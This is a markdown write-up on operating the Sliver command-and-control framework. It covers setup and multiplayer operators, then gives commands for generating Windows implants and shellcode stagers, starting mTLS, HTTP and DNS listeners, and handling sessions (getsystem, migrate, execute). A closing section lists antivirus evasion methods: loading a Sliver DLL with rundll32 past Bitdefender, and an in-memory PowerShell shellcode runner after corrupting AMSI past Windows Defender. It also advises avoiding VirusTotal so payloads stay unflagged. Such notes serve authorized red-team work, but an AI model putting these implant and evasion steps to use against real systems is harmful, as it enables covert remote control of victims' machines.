## Sliver C2 Write Up

[Github repo](https://github.com/BishopFox/sliver)
[Wiki](https://github.com/BishopFox/sliver/wiki/Getting-Started)
[Walkthrough](https://vk9-sec.com/how-to-set-up-use-c2-sliver/)

### Sliver has 2 main components:
- server/client binaries 
- both run on the same node but with multiplayer enabled a server could be hosted on a node and multiple players can connect to it for larger operations.

#### Install:
- Download the latest [release](https://github.com/BishopFox/sliver/releases) for your platform (Client and server), and just run the binary. The first time you run the server it'll need to unpack some assets, which may take a minute or two, subsequent start ups should be faster.

##### For run time compilation of windows binaries install MinGW on the server:
`apt-get install mingw-w64 binutils-mingw-w64 g++-mingw-w64`

##### Running the server
- Navigate to the location of the zipped sliver-server binary and unzip it
- run the binary with ./sliver-server

##### Create a user
- Need to create a session for a player to connect, and add it to the database:
	- `new-player --operator <username> --lhost <IP of node>`
- This will save the config file for the client, make note of the location.
- Enable multiplayer mode for the eventual connection of the client.
	- `multiplayer`

##### Running the client
- Unzip the client zip file
- Can either move the .cfg file to /root/.sliver-client/configs and run the binary or can import it:
	- `./sliver-client import <full path of .cfg>`
- Run the binary again

##### Generating Implants (Refer to the [Wiki](https://github.com/BishopFox/sliver/wiki/Getting-Started) for more instructions)

`generate --mtls <IP Address> --save <Location for implant> --os Windows`  
- By default an exe is generated, can change formats with -f flag: 
	- exe, shared (dll), service, shellcode
- Can change the compiler target with the --os flag, windows is default.
- Can change the protocol (mtls, https, http, dns)
- Can see all previously generated implants with the `slivers` command

##### Listeners
Depending on the protocol chosen in the implant creation need to start a corresponding listener
	- `mtls` `http(s)` `dns`

##### Shells
Transfer the implant to the target by any means and run it to execute the payload, a session should automatically connect if successful

##### Sessions
- Can view all active implants with the `sessions` command
- `use <number>` to interact with that session
- `sessions -k <number>` to kill it

##### Usage
- the help command will show a full list of all commands, it is recommended to explore these in depth for understanding of functionality and OpSec  implications.   
- download, upload, ps, migrate, getsystem, and execute all very useful.
  <br />
#### Advanced Usage
###### Staged shellcode delivery:
Refer to [Stagers](https://github.com/BishopFox/sliver/wiki/Stagers)

Sliver payloads can be large 7MB so a stager maybe required for some delivery/obfuscation methods.

First need to create a shellcode profile for the stager-listener:
- `new-profile --profile-name win-shellcode --mtls <Node IP> --skip-symbols --format shellcode`
- Confirm with `profiles`

Next create a staging listener and link it to the profile:
- `stage-listener --url tcp://<Node IP:1234> --profile win-shellcode`
- Verify it is active with the `jobs` command, should see TCP listening on port 1234

Then generate a stager:
- `generate stager --lhost <node IP> --lport 1234 --format <define type of shelcode> --save <location for output> `
- refer to `help generate stager` for output formats depending on delivery method tested ps1 and raw so far.

Ensure the listener is starter with `mtls`
- check `jobs` again, if on the client binary, should see 3 running jobs 
	- 31137 connected to the server
	- 1234 staging listener
	- 8888 mtls 

Run the staged shellcode as required and refer to [[Sliver#Sliver Usage]] once the session has returned
<br />

#### Delivery Methods for AV Evasion (in progress)
Use antiscan.me to test payloads, NEVER use virustotal
- Dll uploaded to target --> rundll32.exe sliver.dll RunSliver
	- Bypasses bitdefender
- in-memory powershell shellcode runner (amsi.fail to corrupt amsi first)
	- Bypasses Windows Defender
- Executable
	- not stealthy
- C# shellcode runner --> jscript cradle [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
	- Untested 

